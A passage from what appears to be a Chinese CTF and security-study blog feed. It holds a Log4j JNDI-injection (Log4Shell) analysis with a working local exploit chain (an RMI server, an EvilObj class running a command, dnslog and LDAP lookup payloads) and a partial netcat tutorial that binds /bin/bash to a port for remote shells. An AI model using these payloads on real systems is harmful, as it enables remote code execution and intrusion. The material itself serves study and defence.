src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232469.jpg" alt="image-20221002151825195"></p><h3 id="lookups"><a href="#lookups" class="headerlink" title="lookups"></a>lookups</h3><p>å¯ä»¥é€šè¿‡<code>$&#123;xxx:xxx&#125;</code>ç­‰å½¢å¼å¿«é€Ÿè·å–è¿è¡Œåº”ç”¨å®¹å™¨çš„dockerå±æ€§ï¼Œç¯å¢ƒå˜é‡ï¼Œæ—¥å¿—äº‹ä»¶ï¼ŒJavaåº”ç”¨ç¨‹åºç¯å¢ƒä¿¡æ¯ç­‰å†…å®¹ã€‚</p><h1 id="æ¼æ´åŠåˆ†æ"><a href="#æ¼æ´åŠåˆ†æ" class="headerlink" title="æ¼æ´åŠåˆ†æ"></a>æ¼æ´åŠåˆ†æ</h1><h3 id="å½±å“ç‰ˆæœ¬èŒƒå›´"><a href="#å½±å“ç‰ˆæœ¬èŒƒå›´" class="headerlink" title="å½±å“ç‰ˆæœ¬èŒƒå›´"></a>å½±å“ç‰ˆæœ¬èŒƒå›´</h3><p>2.0-beta9 &lt;&#x3D; Apache Log4j &lt;&#x3D; 2.15.0-rc1ï¼ˆ1.xä¸å—å½±å“ï¼‰</p><p>éœ€è¦å¯¼å…¥log4j-coreæ‰è¡Œ</p><p>å…ˆç”¨2.14.0åšå®éªŒ(JDK 1.8ä¸‹)</p><blockquote><p>åŸç†ï¼šJNDIæ³¨å…¥</p></blockquote><h2 id="åˆ©ç”¨lookupsè·å–æ•æ„Ÿä¿¡æ¯"><a href="#åˆ©ç”¨lookupsè·å–æ•æ„Ÿä¿¡æ¯" class="headerlink" title="åˆ©ç”¨lookupsè·å–æ•æ„Ÿä¿¡æ¯"></a>åˆ©ç”¨lookupsè·å–æ•æ„Ÿä¿¡æ¯</h2><p>è¾“å‡ºJDKç‰ˆæœ¬</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">LOGGER.error(<span class="hljs-string">&quot;Java version :&#123;&#125;&quot;</span>,<span class="hljs-string">&quot;$&#123;java:version&#125;&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232986.jpg" alt="image-20221002153617894"></p><h3 id="åŸå› "><a href="#åŸå› " class="headerlink" title="åŸå› "></a>åŸå› </h3><p>ç»„ä»¶ä¸­lookupåŠŸèƒ½çš„å®ç°ç±»JndiLookupçš„è®¾è®¡ç¼ºé™·å¯¼è‡´ï¼Œè¿™ä¸ªç±»æ˜¯åœ¨Log4j-core-xxx.jarï¼Œæ‰€ä»¥è¿™ä¸ªæ¼æ´å’ŒLog4j-coreæœ‰å…³</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232662.jpg" alt="image-20221002153838589"></p><p>åœ¨è°ƒç”¨lookupæ–¹æ³•å¤„æ‰“æ–­ç‚¹</p><p>JNDI lookupçš„æ–¹æ³•è°ƒç”¨åœ¨InitialContext.javaä¸­</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232530.jpg" alt="image-20221002154141225"></p><h3 id="Debugè¿‡ç¨‹"><a href="#Debugè¿‡ç¨‹" class="headerlink" title="Debugè¿‡ç¨‹"></a>Debugè¿‡ç¨‹</h3><p>æµ‹è¯•ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">logger.error(<span class="hljs-string">&quot;é‡çŒªçƒ­æ‹$&#123;jndi:ldap://atf6sq.dnslog.cn&#125;&quot;</span>);<br></code></pre></td></tr></table></figure><p>ç›´æ¥ä¼ å…¥çš„å°±æ˜¯${}ä¸­çš„å†…å®¹(æ²¡æœ‰è¿‡æ»¤),ä¹Ÿæ²¡æœ‰ä¼ å…¥å…¶ä»–éƒ¨åˆ†</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232515.jpg" alt="image-20221002154417043"></p><p>æŸ¥çœ‹æ‰§è¡Œé“¾è¿‡ç¨‹,è¯¥lookupæ–¹æ³•åç»­åœ¨JndiLookupä¸­è¢«è°ƒç”¨</p><p><img src="/../../../../Pictures/%60log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%60/006y8mN6gy1h6qzrx5jggj30u204wgm9.jpg" alt="image-20221002154907000"></p><p>è¿‡ç¨‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">JndiLookup.java:<br>var6 = Objects.toString(jndiManager.lookup(jndiName), (String)<span class="hljs-literal">null</span>);<br><br>JndiManager.java:<br><span class="hljs-keyword">public</span> T <span class="hljs-title function_">lookup</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String name)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.context.lookup(name);<br>&#125;<br><br>Context.java:<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">lookup</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> NamingException;<br><br>InitialContext.java<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">lookup</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br><span class="hljs-keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¹‹åå¤„ç†å˜é‡çš„å·¥ä½œäº¤ç»™äº†StrSubstitutorè¿™ä¸ªç±»</p><p>ä¹‹ååˆè°ƒç”¨äº†MessagePatternConverterè¿™ä¸ªç±»çš„formatæ–¹æ³•</p><ol><li>é¦–å…ˆæ˜¯noLookupsè¿™ä¸ªå±æ€§ï¼Œè®¾ç½®æˆäº†falseï¼Œå¯¼è‡´ä¸‹é¢ä»£ç çš„æ‰§è¡Œï¼ˆç°åœ¨æ¼æ´ä¿®å¤å°†è¿™ä¸ªnoLookupsè®¾ç½®æˆtrueï¼‰</li><li>åé¢çš„ifæ˜æ˜¾æ˜¯è¦å®šä½åˆ°<code>$&#123;</code>ï¼ˆå¹¶ä¸”æ˜¯è¿ç»­çš„ï¼‰ï¼Œå¦‚æœæœ‰è¿™ä¸¤ä¸ªå­—ç¬¦å°±å»replaceå‡½æ•°æ›¿æ¢</li><li>config.getStrSubstitutor()å°±æ˜¯ä¸Šé¢è¯´çš„StrSubstitutor</li></ol><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232226.jpg" alt="image-20221002160354461"></p><blockquote><p>Log4jå°†è¦è¾“å‡ºçš„æ—¥å¿—æ‹¼æ¥æˆå­—ç¬¦ä¸²ä¹‹åï¼Œå®ƒä¼šå»åˆ¤æ–­å­—ç¬¦ä¸²ä¸­æ˜¯å¦åŒ…å«${å’Œ},å¦‚æœåŒ…å«äº†ï¼Œå°±ä¼šå½“ä½œå˜é‡äº¤ç»™StrSubstitutorè¿™ä¸ªç±»å»å¤„ç†ã€‚</p></blockquote><p>StrSubstitutorä¸­resolveVariableæ–¹æ³•è·å–${}ä¸­å­—ç¬¦ä¸²</p><p><img src="/../../../../Pictures/%60log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%60/006y8mN6gy1h6r0jtfl7mj31ck05ojt3.jpg" alt="image-20221002161555507"></p><p>å¯ä»¥çœ‹åˆ°resolverä¸­çš„å†…å®¹ï¼Œå¯ä»¥çœ‹åˆ°Lookupså®šä¹‰äº†12ç§å¤„ç†ç±»å‹ï¼Œå¦‚æœèƒ½åŒ¹é…åˆ°è¿™å‡ ç§å¤„ç†ç±»å‹ï¼Œå°±äº¤ç»™å®ƒä»¬å»å¤„ç†ï¼Œå…¶ä»–çš„éƒ½ä¼šäº¤ç»™defaultLookupå»å¤„ç†ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232081.jpg" alt="image-20221002161942852"></p><blockquote><p>å¦‚æœæˆ‘ä»¬çš„æ—¥å¿—å†…å®¹ä¸­æœ‰<code>$&#123;jndi:rmi://127.0.0.1:1099/hello&#125;</code>è¿™äº›å†…å®¹ï¼Œå»æ‰${å’Œ}ä¼ é€’ç»™resolverçš„å°±æ˜¯<code>jndi:rmi://127.0.0.1:1099/hello</code>ã€‚resolverä¼šå°†ç¬¬ä¸€ä¸ªâ€:â€ä¹‹å‰çš„å†…å®¹å’ŒlookupsåšåŒ¹é…ï¼Œæˆ‘ä»¬è¿™é‡Œè·å–åˆ°çš„æ˜¯jndiï¼Œå°±ä¼šå°†å‰©ä½™éƒ¨åˆ†<code>jndi:rmi://127.0.0.1:1099/hello</code>äº¤ç»™jdniçš„å¤„ç†å™¨JndiLookupå»å¤„ç†ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232251.jpg" alt="image-20221002162800611"></p></blockquote><p>ä¼ å…¥æ˜¯ä¿¡æ¯debugæ ‡æ³¨ï¼Œæœ€å¥½ç”¨çš„lookup.lookupä¹Ÿæ˜¯JNDIçš„lookup</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232513.jpg" alt="image-20221002162941649"></p><blockquote><p>ä»è€Œå¾—åˆ°äº†lookupçš„ç»“æœ</p></blockquote><h3 id="noLookupsç›¸å…³"><a href="#noLookupsç›¸å…³" class="headerlink" title="noLookupsç›¸å…³"></a>noLookupsç›¸å…³</h3><p>è°ƒç”¨formate</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232599.jpg" alt="image-20221002171504977"></p><p>èµ‹å€¼æ“ä½œï¼ˆä½äº MessagePatternConverterç±»ä¸­ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-type">int</span> <span class="hljs-variable">noLookupsIdx</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.loadNoLookups(options);<br>        <span class="hljs-built_in">this</span>.noLookups = Constants.FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS || noLookupsIdx &gt;= <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-title function_">loadNoLookups</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String[] options)</span> &#123;<br>        <span class="hljs-keyword">if</span> (options != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; options.length; ++i) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">option</span> <span class="hljs-operator">=</span> options[i];<br>                <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;nolookups&quot;</span>.equalsIgnoreCase(option)) &#123;<br>                    <span class="hljs-keyword">return</span> i;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><blockquote><p>ç”±äºè°ƒç”¨ MessagePatternConverterç±»çš„formatæ–¹æ³• æ²¡æœ‰ä¼ å…¥optionsä¸”configéç©ºï¼Œå¹¶ä¸”ç¯å¢ƒå˜é‡ä¹Ÿæ²¡æœ‰è®¾ç½®å› æ­¤noLookupsä¸ºfalse</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232069.jpg" alt="image-20221002190435592"></p></blockquote><h3 id="æ¼æ´æ£€æµ‹æ–¹æ³•"><a href="#æ¼æ´æ£€æµ‹æ–¹æ³•" class="headerlink" title="æ¼æ´æ£€æµ‹æ–¹æ³•"></a>æ¼æ´æ£€æµ‹æ–¹æ³•</h3><p>é€šè¿‡dnslogï¼Œè¿˜èƒ½æŸ¥çœ‹jdkç‰ˆæœ¬æ˜¯å¦æ”¯æŒRMIæˆ–è€…ldapæœåŠ¡</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">$&#123;jndi:dns://$&#123;<span class="hljs-keyword">sy</span><span class="hljs-variable">s:java</span>.<span class="hljs-keyword">version</span>&#125;.dnslog/&#125;<br></code></pre></td></tr></table></figure><h3 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h3><p>1ã€å‡çº§åˆ°2.17.0ç‰ˆæœ¬åŠä»¥ä¸Š</p><p>2ã€å‚æ•°ã€ç¯å¢ƒè®¾ç½®</p><ul><li><p>è®¾ç½®jvmå‚æ•°ï¼š-Dlog4j2.formatMsgNoLookups&#x3D;trueï¼Œ</p></li><li><p>è®¾ç½®ç³»ç»Ÿç¯å¢ƒå˜é‡ï¼šFORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS&#x3D;true</p></li></ul><blockquote><p>JNDIå¯è®¿é—®çš„ç°æœ‰çš„ç›®å½•åŠæœåŠ¡æœ‰:JDBCã€LDAPã€RMIã€DNSã€NISã€CORBA</p></blockquote><h2 id="JNDIæ³¨å…¥"><a href="#JNDIæ³¨å…¥" class="headerlink" title="JNDIæ³¨å…¥"></a>JNDIæ³¨å…¥</h2><p>JDKï¼š11.0.15</p><h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>JNDIç›¸å½“äºè‡ªå·±åšä¸€ä¸ªæœåŠ¡ï¼Œå¦‚æœè®¿é—®äº†ä¼šç›´æ¥åœ¨æ”¾æˆ‘è¿™æœ¬æœºä¸Šæ‰§è¡Œæ–¹æ³•ä¸­çš„ä»£ç </p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232104.jpg" alt="image-20221002194642057"></p><h2 id="ç®€å•å¤ç°"><a href="#ç®€å•å¤ç°" class="headerlink" title="ç®€å•å¤ç°"></a>ç®€å•å¤ç°</h2><h3 id="ç»“æ„"><a href="#ç»“æ„" class="headerlink" title="ç»“æ„"></a>ç»“æ„</h3><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072233648.jpg" alt="tststst"></p><p>RMIServer.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.cui.log4jtest.rmi;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>            <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry();<br><br>            System.out.println(<span class="hljs-string">&quot;RMI Listener 1099 port&quot;</span>);<br>            <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;com.cui.log4jtest.rmi.EvilObj&quot;</span>, <span class="hljs-string">&quot;com.cui.log4jtest.rmi.EvilObj&quot;</span>, <span class="hljs-literal">null</span>);<br><br>            <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>            registry.rebind(<span class="hljs-string">&quot;test&quot;</span>, referenceWrapper);<br><br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>EvilObj.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.Name;<br><span class="hljs-keyword">import</span> javax.naming.spi.ObjectFactory;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilObj</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectFactory</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;open a Calculator!&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;open -a Calculator&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-comment">//è¿™é‡Œå¯ä»¥å†™ä»»æ„ä»£ç ï¼Œæ¯”å¦‚æœ¨é©¬ç¨‹åºï¼Œç—…æ¯’ç¨‹åºï¼Œæ­»å¾ªç¯ï¼Œåé—¨ç¨‹åºç­‰ç­‰ã€‚</span><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObjectInstance</span><span class="hljs-params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>log4jDemo1.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">log4jDemo1</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;$&#123;jndi:rmi://127.0.0.1:1099/test&#125;&quot;</span>;<br>            logger.info(<span class="hljs-string">&quot;è¾“å‡ºçš„ä¿¡æ¯æ˜¯:&#123;&#125;&quot;</span>, str);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;&#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>å…ˆå¯åŠ¨RMIServerå†å¯åŠ¨log4jDemo1å°±ä¼šå¼¹å‡ºè®¡ç®—å™¨</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072231797.jpg" alt="image-20221002215727110"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072231698.jpg" alt="image-20221002215800340"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ncå‘½ä»¤å­¦ä¹ åŠåå¼¹shellç»†èŠ‚</title>
      <link href="/2022/09/27/nc%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%E5%8F%8A%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82/"/>
      <url>/2022/09/27/nc%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%E5%8F%8A%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82/</url>
      
        <content type="html"><![CDATA[<h1 id="ncå‘½ä»¤å­¦ä¹ åŠåå¼¹shellç»†èŠ‚"><a href="#ncå‘½ä»¤å­¦ä¹ åŠåå¼¹shellç»†èŠ‚" class="headerlink" title="ncå‘½ä»¤å­¦ä¹ åŠåå¼¹shellç»†èŠ‚"></a>ncå‘½ä»¤å­¦ä¹ åŠåå¼¹shellç»†èŠ‚</h1><table><thead><tr><th align="left">æœºå™¨åç§°</th><th align="left">IPåœ°å€</th><th>æ“ä½œç³»ç»Ÿ</th></tr></thead><tbody><tr><td align="left">root@Decemberus</td><td align="left">114.223.4.218</td><td>Centos7</td></tr><tr><td align="left">root@Sloth</td><td align="left">124.223.207.184</td><td>Centos7</td></tr><tr><td align="left">ğŸ¥£</td><td align="left">å†…ç½‘</td><td>Mac os</td></tr></tbody></table><h2 id="ncå‘½ä»¤ä½¿ç”¨"><a href="#ncå‘½ä»¤ä½¿ç”¨" class="headerlink" title="ncå‘½ä»¤ä½¿ç”¨"></a>ncå‘½ä»¤ä½¿ç”¨</h2><h3 id="ç‰ˆæœ¬"><a href="#ç‰ˆæœ¬" class="headerlink" title="ç‰ˆæœ¬"></a>ç‰ˆæœ¬</h3><ul><li><p><code>netcat-traditional</code>:Kali Linux é»˜è®¤å¸¦çš„å°±æ˜¯è¿™ä¸ªç‰ˆæœ¬ï¼Œè¿™ä¸ªç‰ˆæœ¬çš„ nc å…·æœ‰<code>-e</code>é€‰é¡¹ï¼Œååˆ†æ–¹ä¾¿åå¼¹ shell ä½¿ç”¨</p></li><li><p><code>netcat-openbsd</code>:ubuntu é‡Œé»˜è®¤çš„ nc å‘½ä»¤æŒ‡å‘çš„æ˜¯netcat-openbsdã€‚è¿™ä¸ªç‰ˆæœ¬å› ä¸ºè€ƒè™‘åˆ°å®‰å…¨æ€§ç­‰åŸå› æ²¡æœ‰<code>-e</code>é€‰é¡¹ã€‚</p></li><li><p><code>ncat</code>:CentOSã€Red Hat é»˜è®¤å¸¦çš„æ˜¯ ncatã€‚ç›®å‰ncatå·²ç»é›†æˆåˆ°äº† nmap é‡Œé¢ï¼Œå®‰è£…å®Œ nmap åå°±å¯ä»¥ä½¿ç”¨<code>ncat</code>å‘½ä»¤äº†</p></li></ul><blockquote><p>macä¸Šè‡ªå¸¦ncå‘½ä»¤æŒ‡å‘çš„æ˜¯ncat,linuxä¸Šncä¸ncatæ²¡ä»€ä¹ˆåŒºåˆ«ï¼Œmacä¸Šæœ€å¥½ç”¨ncat,optionsæ¯”è¾ƒå…¨</p></blockquote><h3 id="å‰ææ¡ä»¶åŠæ³¨æ„äº‹é¡¹"><a href="#å‰ææ¡ä»¶åŠæ³¨æ„äº‹é¡¹" class="headerlink" title="å‰ææ¡ä»¶åŠæ³¨æ„äº‹é¡¹"></a>å‰ææ¡ä»¶åŠæ³¨æ„äº‹é¡¹</h3><ul><li><p>åªèƒ½ncæ‹¥æœ‰å…¬ç½‘ipçš„æœºå™¨ï¼Œæˆ–æ˜¯åœ¨åŒä¸€å±€åŸŸç½‘ä¸‹çš„å†…ç½‘æœºå™¨(å¯ä»¥ncå†…ç½‘ip)</p></li><li><p>è·å–æœ¬æœºå…¬ç½‘ip</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl ifconfig.me <br></code></pre></td></tr></table></figure></li><li><p>ç«¯å£æ”¾è¡Œï¼šå¦‚æœæ˜¯è´­ä¹°äº†è…¾è®¯äº‘æœåŠ¡ï¼Œè¦åœ¨æ§åˆ¶å°å’Œå®å¡”é¢æ¿åŒæ—¶æ”¾è¡Œç«¯å£(ç”¨äºTCPè¿æ¥)</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310253657.jpg" alt="image-20220926010406603"></p></li><li><p>éœ€è¦vpså…ˆç›‘å¬ï¼Œç›®æ ‡æœåŠ¡å™¨å†nc vpsï¼Œç›´æ¥ncåªèƒ½é€šè¿‡udpè¿æ¥ï¼Œtcpè¿æ¥æ˜¾ç¤ºæ‹’ç»(å¦‚æœæ˜¯ç«¯å£æœªæ”¾è¡Œä¼šæ˜¾ç¤ºè¿æ¥è¶…æ—¶)</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310254528.jpg" alt="image-20220926005629905"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310254598.jpg" alt="image-20220926005900622"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">æœªæ”¾è¡Œç«¯å£</span><br>[root@Decemberus ~]# nc 124.223.207.184 3345<br>Ncat: Connection timed out.<br></code></pre></td></tr></table></figure></li></ul><h3 id="æ–‡å­—äº¤äº’"><a href="#æ–‡å­—äº¤äº’" class="headerlink" title="æ–‡å­—äº¤äº’"></a>æ–‡å­—äº¤äº’</h3><p><code>-l</code>ï¼šä½¿ç”¨ç›‘å¬æ¨¡å¼ï¼Œç›‘æ§ä¼ å…¥çš„ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -l 3344 <span class="hljs-comment"># ç›‘å¬3344ç«¯å£</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310254143.jpg" alt="image-20220926004654073"></p><blockquote><p>åªæ˜¯ç®€å•çš„æ–‡å­—äº¤äº’ï¼Œç›¸å½“äºèŠå¤©å·¥å…·ï¼Œå¯¹æ•°æ®ç¼–ç æ²¡æœ‰è¦æ±‚ï¼Œä½†æ— æ³•æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p></blockquote><h3 id="å‘½ä»¤äº¤äº’"><a href="#å‘½ä»¤äº¤äº’" class="headerlink" title="å‘½ä»¤äº¤äº’"></a>å‘½ä»¤äº¤äº’</h3><p><code>-e</code>ï¼šå°†ä¼ å…¥çš„ä¿¡æ¯ä»¥å‘½ä»¤æ‰§è¡Œ</p><p>å°†<code>/bin/bash</code>é€šè¿‡ 3344 ç«¯å£æ¥ç›‘å¬ï¼Œå°†æ”¶åˆ°çš„ä¿¡æ¯éƒ½å‘é€åˆ°<code>/bin/bash</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ncat -l -e /bin/bash 3344<br></code></pre></td></tr></table></figure><blockquote><p><code>/bin/bash</code>æ˜¯shellè§£é‡Šå™¨ï¼Œæ ¹æ®ç›®æ ‡æœºå™¨ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨<code>/bin/sh</code>æˆ–<code>/bin/zsh</code></p><p>è®¿é—®ç«¯å¯ä»¥é€šè¿‡ncè¯¥ç³»ç»Ÿçš„2333ç«¯å£ï¼Œè¾“å…¥ç«¯æŒ‡ä»¤ä¼šä¼ å…¥è¯¥ç³»ç»Ÿçš„&#x2F;bin&#x2F;bash æ‰§è¡ŒæˆåŠŸåä¼šè¿”å›ä¿¡æ¯ï¼Œç±»ä¼¼äºsshæ“ä½œè¿æ¥æ¥è¯¥ç³»ç»Ÿä¸€æ ·</p></blockquote><h3 id="æŒä¹…ç›‘å¬"><a href="#æŒä¹…ç›‘å¬" class="headerlink" title="æŒä¹…ç›‘å¬"></a>æŒä¹…ç›‘å¬</h3><p><code>-k</code>: 